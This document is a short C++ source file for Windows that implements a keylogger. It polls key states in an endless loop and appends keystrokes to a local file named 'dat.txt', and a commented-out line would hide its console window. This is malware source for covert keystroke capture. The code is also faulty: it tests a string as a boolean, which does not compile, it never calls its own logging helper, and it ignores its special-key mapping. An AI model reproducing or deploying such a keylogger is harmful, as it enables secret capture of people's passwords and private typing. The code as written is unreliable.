#include <Windows.h>
#include <string>
#include <iostream>
#include <fstream>



using namespace std;



void LOG(string input) {
	fstream LogFile;
	LogFile.open("dat.txt", fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}


string parseUnprintable(int S_key) {
	switch (S_key) {
	case VK_SPACE:
		return " ";
	case VK_RETURN:
		return "#ENTER#";
	case VK_SHIFT:
		return "#SHIFT#";	
	case VK_RSHIFT:
		return "#RSHIFT#";
	case VK_CONTROL:
		return "#CONTROL#";
	case VK_MENU:
		return "#ALT#";
	case VK_BACK:
		return "#BACK#";
	case VK_RBUTTON:
		return "#R_CLICK#";
	case VK_CAPITAL:
		return "#CAPS#";
	case VK_TAB:
		return "#TAB#";
	case VK_UP:
		return "#UP#";
	case VK_DOWN:
		return "#DOWN#";
	case VK_LEFT:
		return "#LEFT#";
	case VK_RIGHT:
		return "#RIGHT#";
	default: 
		return "";
	}
}



int main()
{
	//ShowWindow(GetConsoleWindow(), SW_HIDE);

	while (true) {
		Sleep(10);
		for (int key = 8; key <= 190; key++)
		{
			if (GetAsyncKeyState(key) == -32767) {


				if (parseUnprintable(key)) {

					fstream LogFile;
					LogFile.open("dat.txt", fstream::app);
					if (LogFile.is_open()) {
						LogFile << char(key);
						LogFile.close();
					}

				}
			}
		}
	}

	return 0;
}
